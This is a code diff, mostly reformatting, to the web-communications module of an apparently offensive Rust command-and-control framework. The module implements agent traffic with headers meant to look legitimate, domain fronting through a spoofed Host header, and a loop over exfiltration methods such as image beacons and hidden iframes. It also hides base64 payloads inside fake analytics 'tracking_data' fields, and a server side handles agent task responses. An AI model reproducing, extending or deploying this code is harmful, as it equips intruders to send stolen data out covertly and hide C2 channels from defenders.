@@ -3,19 +3,31 @@
 //! Provides HTTP/WebSocket fallback communication methods integrating catch system's
 //! data exfiltration techniques with rust-nexus's secure gRPC communication layer.
 
-use std::collections::HashMap;
-use serde::{Deserialize, Serialize};
-use reqwest::Client;
-use tokio_tungstenite::{connect_async, WebSocketStream, MaybeTlsStream};
-use tokio::net::TcpStream;
-use futures_util::{SinkExt, StreamExt};
-use base64::{Engine as _, engine::general_purpose};
-use log::{info, warn, error, debug};
+// v1.4 commit-prep: overlay-supplied module with unused fields on the
+// HTTP/WebSocket clients (real wiring is pending). Suppress at the
+// crate level rather than annotating each unused field — the planned
+// v1.5 refactor wires them.
+#![allow(dead_code)]
 
-pub mod http_fallback;
-pub mod websocket_fallback;
+use base64::{engine::general_purpose, Engine as _};
+use futures_util::{SinkExt, StreamExt};
+use log::{debug, error, info, warn};
+use reqwest::Client;
+use serde::{Deserialize, Serialize};
+use std::collections::HashMap;
+use tokio::net::TcpStream;
+use tokio_tungstenite::{connect_async, MaybeTlsStream, WebSocketStream};
+
 pub mod domain_fronting;
+pub mod http_fallback;
 pub mod traffic_obfuscation;
+pub mod websocket_fallback;
+
+// v1.1 integration addition.
+pub mod transport;
+pub use transport::{
+    shutdown_from, ShutdownFuture, Transport, TransportContext, TransportKind, UnknownTransport,
+};
 
 use nexus_common::*;
 // Temporarily commented out due to compilation issues
@@ -256,20 +268,34 @@ impl WebCommsClient {
         let mut headers = reqwest::header::HeaderMap::new();
 
         // Set default headers for legitimate appearance
-        headers.insert(reqwest::header::ACCEPT, "application/json, text/plain, */*".parse().unwrap());
-        headers.insert(reqwest::header::ACCEPT_LANGUAGE, "en-US,en;q=0.9".parse().unwrap());
-        headers.insert(reqwest::header::ACCEPT_ENCODING, "gzip, deflate, br".parse().unwrap());
+        headers.insert(
+            reqwest::header::ACCEPT,
+            "application/json, text/plain, */*".parse().unwrap(),
+        );
+        headers.insert(
+            reqwest::header::ACCEPT_LANGUAGE,
+            "en-US,en;q=0.9".parse().unwrap(),
+        );
+        headers.insert(
+            reqwest::header::ACCEPT_ENCODING,
+            "gzip, deflate, br".parse().unwrap(),
+        );
 
         // Add domain fronting headers if enabled
         if config.domain_fronting.enabled {
-            headers.insert(reqwest::header::HOST, config.domain_fronting.real_host.parse().unwrap());
+            headers.insert(
+                reqwest::header::HOST,
+                config.domain_fronting.real_host.parse().unwrap(),
+            );
 
             for (key, value) in &config.domain_fronting.custom_headers {
                 headers.insert(
-                    reqwest::header::HeaderName::from_bytes(key.as_bytes())
-                        .map_err(|e| NexusError::ConfigurationError(format!("Invalid header name: {}", e)))?,
-                    value.parse()
-                        .map_err(|e| NexusError::ConfigurationError(format!("Invalid header value: {}", e)))?,
+                    reqwest::header::HeaderName::from_bytes(key.as_bytes()).map_err(|e| {
+                        NexusError::ConfigurationError(format!("Invalid header name: {}", e))
+                    })?,
+                    value.parse().map_err(|e| {
+                        NexusError::ConfigurationError(format!("Invalid header value: {}", e))
+                    })?,
                 );
             }
         }
@@ -278,9 +304,13 @@ impl WebCommsClient {
             .timeout(std::time::Duration::from_secs(config.request_timeout))
             .default_headers(headers)
             .build()
-            .map_err(|e| NexusError::NetworkError(format!("Failed to create HTTP client: {}", e)))?;
+            .map_err(|e| {
+                NexusError::NetworkError(format!("Failed to create HTTP client: {}", e))
+            })?;
 
-        let current_endpoint = config.primary_endpoints.first()
+        let current_endpoint = config
+            .primary_endpoints
+            .first()
             .unwrap_or(&"https://example.com".to_string())
             .clone();
 
@@ -306,40 +336,47 @@ impl WebCommsClient {
                 match self.send_http_to_endpoint(&endpoint, &message).await {
                     Ok(response) => return Ok(response),
                     Err(e) => {
-                        warn!("HTTP send attempt {} to {} failed: {}", attempt + 1, endpoint, e);
+                        warn!(
+                            "HTTP send attempt {} to {} failed: {}",
+                            attempt + 1,
+                            endpoint,
+                            e
+                        );
                         last_error = Some(e);
 
                         if attempt < self.config.max_retries - 1 {
                             tokio::time::sleep(std::time::Duration::from_millis(
-                                1000 * (attempt + 1) as u64
-                            )).await;
+                                1000 * (attempt + 1) as u64,
+                            ))
+                            .await;
                         }
                     }
                 }
             }
         }
 
-        Err(last_error.unwrap_or_else(|| {
-            NexusError::NetworkError("All HTTP endpoints failed".to_string())
-        }))
+        Err(last_error
+            .unwrap_or_else(|| NexusError::NetworkError("All HTTP endpoints failed".to_string())))
     }
 
     /// Send HTTP message to specific endpoint using catch exfiltration techniques
-    async fn send_http_to_endpoint(&self, endpoint: &str, message: &WebCommsMessage) -> Result<String> {
+    async fn send_http_to_endpoint(
+        &self,
+        endpoint: &str,
+        message: &WebCommsMessage,
+    ) -> Result<String> {
         use crate::http_fallback::HttpExfiltration;
 
         let exfiltration = HttpExfiltration::new(&self.config);
 
         // Try multiple exfiltration methods (like catch system)
-        let methods = vec![
-            "post_json",
-            "image_beacon",
-            "hidden_iframe",
-            "fetch_api",
-        ];
+        let methods = vec!["post_json", "image_beacon", "hidden_iframe", "fetch_api"];
 
         for method in methods {
-            match exfiltration.exfiltrate_data(endpoint, message, method).await {
+            match exfiltration
+                .exfiltrate_data(endpoint, message, method)
+                .await
+            {
                 Ok(response) => return Ok(response),
                 Err(e) => {
                     debug!("Exfiltration method {} failed: {}", method, e);
@@ -348,7 +385,9 @@ impl WebCommsClient {
             }
         }
 
-        Err(NexusError::NetworkError("All exfiltration methods failed".to_string()))
+        Err(NexusError::NetworkError(
+            "All exfiltration methods failed".to_string(),
+        ))
     }
 
     /// Send message via WebSocket
@@ -357,8 +396,7 @@ impl WebCommsClient {
             self.establish_websocket_connection().await?;
         }
 
-        let serialized = serde_json::to_string(&message)
-            .map_err(NexusError::SerializationError)?;
+        let serialized = serde_json::to_string(&message).map_err(NexusError::SerializationError)?;
 
         let obfuscated = if self.config.obfuscation.enabled {
             self.obfuscate_data(&serialized)?
@@ -373,14 +411,19 @@ impl WebCommsClient {
 
             Ok(())
         } else {
-            Err(NexusError::NetworkError("WebSocket connection not available".to_string()))
+            Err(NexusError::NetworkError(
+                "WebSocket connection not available".to_string(),
+            ))
         }
     }
 
     /// Establish WebSocket connection
     async fn establish_websocket_connection(&mut self) -> Result<()> {
         for endpoint in &self.config.primary_endpoints {
-            let ws_url = endpoint.replace("http://", "ws://").replace("https://", "wss://") + "/ws";
+            let ws_url = endpoint
+                .replace("http://", "ws://")
+                .replace("https://", "wss://")
+                + "/ws";
 
             match connect_async(&ws_url).await {
                 Ok((ws_stream, _)) => {
@@ -395,7 +438,9 @@ impl WebCommsClient {
             }
         }
 
-        Err(NexusError::NetworkError("Failed to establish WebSocket connection".to_string()))
+        Err(NexusError::NetworkError(
+            "Failed to establish WebSocket connection".to_string(),
+        ))
     }
 
     /// Receive message from WebSocket
@@ -479,7 +524,9 @@ impl WebCommsClient {
             }
         }
 
-        Err(NexusError::NetworkError("All communication methods failed".to_string()))
+        Err(NexusError::NetworkError(
+            "All communication methods failed".to_string(),
+        ))
     }
 
     /// Create a legitimate-looking message for obfuscation
@@ -493,8 +540,10 @@ impl WebCommsClient {
         properties.insert("session_duration".to_string(), "1234".to_string());
 
         // Hide actual data in a property that looks legitimate
-        properties.insert("tracking_data".to_string(),
-            general_purpose::STANDARD.encode(data));
+        properties.insert(
+            "tracking_data".to_string(),
+            general_purpose::STANDARD.encode(data),
+        );
 
         WebCommsMessage::Analytics(AnalyticsData {
             session_id: Uuid::new_v4().to_string(),
@@ -512,18 +561,24 @@ impl WebCommsClient {
             WebCommsMessage::Analytics(analytics) => {
                 for event in &analytics.events {
                     if let Some(tracking_data) = event.properties.get("tracking_data") {
-                        let decoded = general_purpose::STANDARD
-                            .decode(tracking_data)
-                            .map_err(|e| NexusError::ConfigurationError(format!("Base64 decode error: {}", e)))?;
+                        let decoded =
+                            general_purpose::STANDARD
+                                .decode(tracking_data)
+                                .map_err(|e| {
+                                    NexusError::ConfigurationError(format!(
+                                        "Base64 decode error: {}",
+                                        e
+                                    ))
+                                })?;
                         return Ok(Some(String::from_utf8_lossy(&decoded).to_string()));
                     }
                 }
             }
             WebCommsMessage::Metrics(metrics) => {
                 if let Some(hidden) = &metrics.hidden_data {
-                    let decoded = general_purpose::STANDARD
-                        .decode(hidden)
-                        .map_err(|e| NexusError::ConfigurationError(format!("Base64 decode error: {}", e)))?;
+                    let decoded = general_purpose::STANDARD.decode(hidden).map_err(|e| {
+                        NexusError::ConfigurationError(format!("Base64 decode error: {}", e))
+                    })?;
                     return Ok(Some(String::from_utf8_lossy(&decoded).to_string()));
                 }
             }
@@ -566,7 +621,10 @@ impl WebCommsServer {
                 }))
             }
             WebCommsMessage::TaskResponse(response) => {
-                info!("Task response from {}: {}", response.agent_id, response.task_id);
+                info!(
+                    "Task response from {}: {}",
+                    response.agent_id, response.task_id
+                );
                 // Process task result
                 Ok(WebCommsMessage::Heartbeat(HeartbeatData {
                     agent_id: response.agent_id,
